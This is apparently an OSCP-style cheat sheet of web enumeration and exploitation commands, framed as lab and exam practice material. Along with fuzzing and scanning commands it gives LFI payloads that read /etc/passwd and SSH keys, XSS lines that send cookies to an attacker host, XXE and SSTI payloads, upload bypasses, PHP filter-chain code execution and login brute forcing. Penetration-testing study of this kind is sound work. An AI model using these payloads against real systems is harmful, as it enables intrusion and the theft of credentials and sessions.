# Web enumeration and exploitation

[Practice methodology](../Practice-Exam-Methodology.md) · [Reference index](00-Reference-Index.md)

Commands preserved from the original reference. Replace angle-bracket placeholders before running; check your installed tool’s help for version-specific options. This collection includes general lab material; inclusion does not establish exam permission. See [exam rules](../OSCP-Exam-Rules.md).


## Burp Suite

```
Ctrl+r          # send to repeater
Ctrl+i          # send to intruder
Ctrl+Shift+b    # base64 encode
Ctrl+Shift+u    # URL decode

export HTTP_PROXY=http://localhost:8080      # route HTTP CLI traffic through Burp
export HTTPS_PROXY=https://localhost:8080    # route HTTPS CLI traffic through Burp
```

## Arjun

```bash
arjun -u http://<RHOST.TLD>/<PATH>                                        # discover GET parameters on one endpoint
arjun -u http://<RHOST.TLD>/<PATH> -m POST                                # discover POST parameters on one endpoint
arjun -u http://<RHOST.TLD>/<PATH> --headers "Cookie: <COOKIE>"           # discover parameters with session cookie
arjun -i <URLS_FILE> -oT <OUTPUT_FILE>                                    # discover parameters across URL list
```

## ffuf

```bash
# Directory scan
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST.TLD>/FUZZ --fs <NUMBER> -mc all          # fuzz directories while filtering size
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST.TLD>/FUZZ -mc 200,204,301,302,307,401    # fuzz directories by status code

# Parameter fuzzing
ffuf -u "http://<RHOST.TLD>/<PATH>?FUZZ=<VALUE>" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac    # fuzz GET parameter names and learn baseline noise

# Subdomain/VHost
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<RHOST.TLD> -H "Host: FUZZ.<RHOST.TLD>" -ac                          # fuzz virtual hosts with auto-calibration
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<RHOST.TLD> -H "Host: FUZZ.<RHOST.TLD>" -fs 0 -ac -fc 400,404,500    # fuzz virtual hosts with filters
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST.TLD>" -fs 185                                # fuzz vhosts with color output

# API fuzzing
ffuf -u https://<RHOST.TLD>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412    # fuzz API endpoints

# LFI
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../index.php?page=FUZZ -fs 15349    # fuzz LFI payloads

# With PHP session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u "http://<RHOST.TLD>/admin/FUZZ.php" -b "PHPSESSID=<COOKIE>" -fw 2644    # fuzz authenticated PHP files

# Recursion
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/FUZZ -recursion    # recursively fuzz directories

# File extensions
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/FUZZ -e .log    # fuzz names with extension
```

## feroxbuster

```bash
feroxbuster -u http://<RHOST> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -r --filter-status 403    # recursive directory brute force
feroxbuster -u http://<RHOST> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -t 100         # virtual host brute force
feroxbuster -u https://<RHOST> -k                                                                                                                   # ignore invalid TLS certificates
```

## Gobuster

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/                                     # brute force web directories
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php                                         # brute force PHP files
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200                                   # brute force common extensions
gobuster dns -d <DOMAIN> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt                             # brute force DNS subdomains
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain    # brute force virtual hosts

# Common extensions: txt,bak,php,html,js,asp,aspx
```

## Nuclei / ProjectDiscovery

```bash
nuclei -target <RHOST> -as                                                                     # run automatic tech-detected scan against host or IP
nuclei -target http://<RHOST.TLD> -as                                                          # run automatic tech-detected web scan
nuclei -target http://<RHOST.TLD> -s medium,high,critical                                      # run higher-signal severity templates
nuclei -target http://<RHOST.TLD> -tags exposure,misconfig,cve -o nuclei.txt                   # scan common OSCP-relevant tags and save output
nuclei -list <URLS_FILE> -s high,critical -rl 25 -c 10 -o nuclei-high.txt                      # scan URL list with conservative rate and concurrency
nuclei -list <URLS_FILE> -jsonl -o nuclei.jsonl                                                # save machine-readable findings
nuclei -target http://<RHOST.TLD> -H "Cookie: <COOKIE>"                                        # scan authenticated app with session cookie
nuclei -target http://<RHOST.TLD> -proxy http://127.0.0.1:8080                                 # route scan through Burp
nuclei -ut                                                                                     # update nuclei templates
nuclei -tl -tags cve,exposure,misconfig                                                        # list matching templates before scanning
httpx-toolkit -l <HOSTS_FILE> -sc -title -td -server -fr -o <URLS_FILE>                        # probe hosts and fingerprint live HTTP services
naabu -host <RHOST> -top-ports 1000 -silent | httpx-toolkit -silent -sc -title -td             # discover web services on common ports
subfinder -d <DOMAIN> -silent | dnsx -silent -a -o <RESOLVED_FILE>                             # find and resolve subdomains
subfinder -d <DOMAIN> -silent | httpx-toolkit -silent -sc -title -td -o <URLS_FILE>            # find live web subdomains for nuclei
cat <URLS_FILE> | nuclei -as -s medium,high,critical -o nuclei.txt                             # scan probed URLs with tech detection
```

## wfuzz

```bash
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'                             # fuzz path segment and hide errors
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/FUZZ.txt --sc 200 -t 20                                                        # fuzz files and show 200s
wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/    # fuzz virtual hosts
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST --hc 200 -c        # fuzz login email field
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select         # fuzz POST parameter for SQLi
```

## WPScan

```bash
wpscan --url https://<RHOST> --enumerate u,t,p                      # enumerate WordPress users, themes, plugins
wpscan --url https://<RHOST> --plugins-detection aggressive         # aggressively detect WordPress plugins
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50    # brute force WordPress login
```

## Local File Inclusion (LFI)

```bash
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd       # test basic LFI path traversal
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd%00    # php < 5.3
```

### Encoded Traversal Strings
```
../
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
..././
```

### php://filter Wrapper
```bash
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index          # read PHP source through filter
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd    # read local file through filter
base64 -d <FILE>.php                                                                     # decode php://filter base64 output
```

### Key Linux Files
```
/etc/passwd          /etc/shadow          /etc/hosts
/proc/self/environ   /proc/self/net/arp   /proc/cmdline
~/.ssh/id_rsa        ~/.bash_history      ~/.ssh/authorized_keys
/var/log/apache2/access.log              /var/log/auth.log
/etc/ssh/sshd_config                     /etc/crontab
```

### Key Windows Files
```
C:/Windows/repair/SAM                    C:/Windows/win.ini
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/Panther/Unattend/Unattended.xml
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
```

## Server-Side Template Injection (SSTI)

```
# Fuzz string
${{<%[%'"}}%\.

# Magic payload
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

## Cross-Site Scripting (XSS)

```html
<script>alert('XSS');</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>new Image().src="http://<ATTACKER_IP>/collect?c="+encodeURIComponent(document.cookie)</script>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
```

## XML External Entity (XXE)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
<stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

## PHP Upload Filter Bypasses

```
.phtml .phP .Php .php3 .php4 .php5 .php7 .pht .phar
<FILE>.php%00.jpg    <FILE>.php%0a    <FILE>.php.jpg
```

## PHP Filter Chain Generator

```bash
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'           # generate PHP filter RCE chain
python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"    # generate command-execution filter chain
```

## GitTools

```bash
./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER    # dump exposed .git directory
./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/       # reconstruct source from dumped git objects
```
